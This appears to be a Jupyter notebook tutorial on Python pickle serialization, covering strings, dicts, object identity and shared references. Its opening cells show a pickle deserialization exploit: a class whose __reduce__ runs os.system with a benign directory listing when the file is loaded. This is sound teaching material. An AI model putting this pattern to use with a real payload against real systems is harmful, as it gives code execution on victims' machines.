{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "departmental-disease",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "educational-reviewer",
   "metadata": {},
   "outputs": [],
   "source": [
    "class Exploit:\n",
    "    def __reduce__(self):\n",
    "        return (os.system, ('dir .. > exploit.txt',))\n",
    "    \n",
    "def serialize_exploit(fname):\n",
    "    with open(fname, 'wb') as file:\n",
    "        pickle.dump(Exploit(), file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "dominican-desire",
   "metadata": {},
   "outputs": [],
   "source": [
    "serialize_exploit('loadme')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "former-store",
   "metadata": {},
   "source": [
    " From user perspective "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "lyric-homeless",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('loadme', 'rb') as file:\n",
    "    pickle.load(file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "lovely-solomon",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps('Pickle is spicy')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "occupational-antarctica",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x13\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x0fPickle is spicy\\x94.'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "coordinate-reserve",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Pickle is spicy'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "expressed-ratio",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(1)\n",
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "interracial-republic",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser is deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "intended-castle",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(b'\\x80\\x04K\\x01.', 1)"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser, deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "corporate-emperor",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "True == deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "representative-samba",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "1 == deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "progressive-freedom",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "<>:1: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\n",
      "<>:1: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\n",
      "<ipython-input-16-93c10e5dcaf2>:1: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\n",
      "  1 is deser\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "1 is deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "logical-usage",
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "file must have 'read' and 'readline' attributes",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-19-8c0fd24e7438>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mdeser\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mpickle\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mload\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;36m1\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m: file must have 'read' and 'readline' attributes"
     ]
    }
   ],
   "source": [
    "deser = pickle.load(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "likely-cleaner",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(b'\\x80\\x04\\x95\\x13\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x0fPickle is spicy\\x94.')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "excellent-appointment",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Pickle is spicy'"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "outstanding-skill",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a':1, 'b':2}\n",
    "d2 = {'x':100, 'y':200, 'z':d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "buried-chase",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "pressed-liberia",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95%\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x01x\\x94Kd\\x8c\\x01y\\x94K\\xc8\\x8c\\x01z\\x94}\\x94(\\x8c\\x01a\\x94K\\x01\\x8c\\x01b\\x94K\\x02uu.'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "pharmaceutical-sympathy",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "committed-elite",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'x': 100, 'y': 200, 'z': {'a': 1, 'b': 2}}"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "atlantic-radius",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser == d2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "legislative-danish",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(d1)\n",
    "d1 = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "gorgeous-reason",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'a': 1, 'b': 2}"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "complex-figure",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d1 is deser['z']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "powered-boating",
   "metadata": {},
   "outputs": [],
   "source": [
    "d1 = {'a': 10, 'b': 20}\n",
    "d2 = {'x': 100, 'y': d1, 'z': d1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "practical-river",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser_d1 = pickle.dumps(d1)\n",
    "ser_d2 = pickle.dumps(d2)\n",
    "\n",
    "d1 = pickle.loads(ser_d1)\n",
    "d2 = pickle.loads(ser_d2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "dangerous-dollar",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "({'a': 10, 'b': 20},\n",
       " {'x': 100, 'y': {'a': 10, 'b': 20}, 'z': {'a': 10, 'b': 20}})"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d1, d2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "common-output",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d1 == d2['y']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "pediatric-purchase",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, False)"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d2['y'] is d2['z'], d2['y'] is d1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "biblical-block",
   "metadata": {},
   "outputs": [],
   "source": [
    "class Person:\n",
    "    def __init__(self, name, age):\n",
    "        self.name = name\n",
    "        self.age = age\n",
    "        \n",
    "    def __eq__(self, other):\n",
    "        return self.name == other.name and self.age == other.age\n",
    "        \n",
    "    def __repr__(self):\n",
    "        return f'Person(name={self.name}, age={self.age})'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "functional-county",
   "metadata": {},
   "outputs": [],
   "source": [
    "hyder = Person('Hyder', 21)\n",
    "jabeen = Person('Jabeen', 20)\n",
    "rubeen = Person('Rubeen', 17)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "accomplished-airfare",
   "metadata": {},
   "outputs": [],
   "source": [
    "sai = {\n",
    "    'title' : 'Mere sai',\n",
    "    'Channel' : 'Sony Tv',\n",
    "    'Fans' : [jabeen, rubeen]\n",
    "}\n",
    "\n",
    "ahilia = {\n",
    "    'title' : 'Ahilia',\n",
    "    'Channel' : 'Sony Tv',\n",
    "    'fans' : [hyder, jabeen, rubeen]\n",
    "}\n",
    "\n",
    "cook_with_comali = {\n",
    "    'title' : 'Cook With Comali',\n",
    "    'Channel' : 'Vijay Tv',\n",
    "    'fans' : [hyder]\n",
    "}\n",
    "\n",
    "fan_favorites = {\n",
    "    'user1' : (sai, ahilia),\n",
    "    'user2' : (cook_with_comali, ),\n",
    "    'user3' : (ahilia, cook_with_comali)\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "peripheral-chamber",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'user1': ({'title': 'Mere sai',\n",
       "   'Channel': 'Sony Tv',\n",
       "   'Fans': [Person(name=Jabeen, age=20), Person(name=Rubeen, age=17)]},\n",
       "  {'title': 'Ahilia',\n",
       "   'Channel': 'Sony Tv',\n",
       "   'fans': [Person(name=Hyder, age=21),\n",
       "    Person(name=Jabeen, age=20),\n",
       "    Person(name=Rubeen, age=17)]}),\n",
       " 'user2': ({'title': 'Cook With Comali',\n",
       "   'Channel': 'Vijay Tv',\n",
       "   'fans': [Person(name=Hyder, age=21)]},),\n",
       " 'user3': ({'title': 'Ahilia',\n",
       "   'Channel': 'Sony Tv',\n",
       "   'fans': [Person(name=Hyder, age=21),\n",
       "    Person(name=Jabeen, age=20),\n",
       "    Person(name=Rubeen, age=17)]},\n",
       "  {'title': 'Cook With Comali',\n",
       "   'Channel': 'Vijay Tv',\n",
       "   'fans': [Person(name=Hyder, age=21)]})}"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fan_favorites"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "intellectual-temperature",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Pretty printing has been turned OFF\n"
     ]
    }
   ],
   "source": [
    "pprint(fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "academic-soundtrack",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pprint import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "cosmetic-square",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'user1': ({'Channel': 'Sony Tv',\n",
      "            'Fans': [Person(name=Jabeen, age=20), Person(name=Rubeen, age=17)],\n",
      "            'title': 'Mere sai'},\n",
      "           {'Channel': 'Sony Tv',\n",
      "            'fans': [Person(name=Hyder, age=21),\n",
      "                     Person(name=Jabeen, age=20),\n",
      "                     Person(name=Rubeen, age=17)],\n",
      "            'title': 'Ahilia'}),\n",
      " 'user2': ({'Channel': 'Vijay Tv',\n",
      "            'fans': [Person(name=Hyder, age=21)],\n",
      "            'title': 'Cook With Comali'},),\n",
      " 'user3': ({'Channel': 'Sony Tv',\n",
      "            'fans': [Person(name=Hyder, age=21),\n",
      "                     Person(name=Jabeen, age=20),\n",
      "                     Person(name=Rubeen, age=17)],\n",
      "            'title': 'Ahilia'},\n",
      "           {'Channel': 'Vijay Tv',\n",
      "            'fans': [Person(name=Hyder, age=21)],\n",
      "            'title': 'Cook With Comali'})}\n"
     ]
    }
   ],
   "source": [
    "pprint(fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "traditional-license",
   "metadata": {},
   "outputs": [],
   "source": [
    "ser = pickle.dumps(fan_favorites)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "daily-magic",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04\\x95\\x1b\\x01\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x05user1\\x94}\\x94(\\x8c\\x05title\\x94\\x8c\\x08Mere sai\\x94\\x8c\\x07Channel\\x94\\x8c\\x07Sony Tv\\x94\\x8c\\x04Fans\\x94]\\x94(\\x8c\\x08__main__\\x94\\x8c\\x06Person\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x04name\\x94\\x8c\\x06Jabeen\\x94\\x8c\\x03age\\x94K\\x14ubh\\x0b)\\x81\\x94}\\x94(h\\x0e\\x8c\\x06Rubeen\\x94h\\x10K\\x11ubeu}\\x94(h\\x03\\x8c\\x06Ahilia\\x94h\\x05\\x8c\\x07Sony Tv\\x94\\x8c\\x04fans\\x94]\\x94(h\\x0b)\\x81\\x94}\\x94(h\\x0e\\x8c\\x05Hyder\\x94h\\x10K\\x15ubh\\x0ch\\x11eu\\x86\\x94\\x8c\\x05user2\\x94}\\x94(h\\x03\\x8c\\x10Cook With Comali\\x94h\\x05\\x8c\\x08Vijay Tv\\x94h\\x17]\\x94h\\x19au\\x85\\x94\\x8c\\x05user3\\x94h\\x14h\\x1e\\x86\\x94u.'"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "discrete-anchor",
   "metadata": {},
   "outputs": [],
   "source": [
    "deser = pickle.loads(ser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "demonstrated-nevada",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'user1': ({'title': 'Mere sai', 'Channel': 'Sony Tv', 'Fans': [Person(name=Jabeen, age=20), Person(name=Rubeen, age=17)]}, {'title': 'Ahilia', 'Channel': 'Sony Tv', 'fans': [Person(name=Hyder, age=21), Person(name=Jabeen, age=20), Person(name=Rubeen, age=17)]}), 'user2': ({'title': 'Cook With Comali', 'Channel': 'Vijay Tv', 'fans': [Person(name=Hyder, age=21)]},), 'user3': ({'title': 'Ahilia', 'Channel': 'Sony Tv', 'fans': [Person(name=Hyder, age=21), Person(name=Jabeen, age=20), Person(name=Rubeen, age=17)]}, {'title': 'Cook With Comali', 'Channel': 'Vijay Tv', 'fans': [Person(name=Hyder, age=21)]})}"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "legitimate-agreement",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deser['user2'][0] is deser['user3'][1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "looking-cross",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
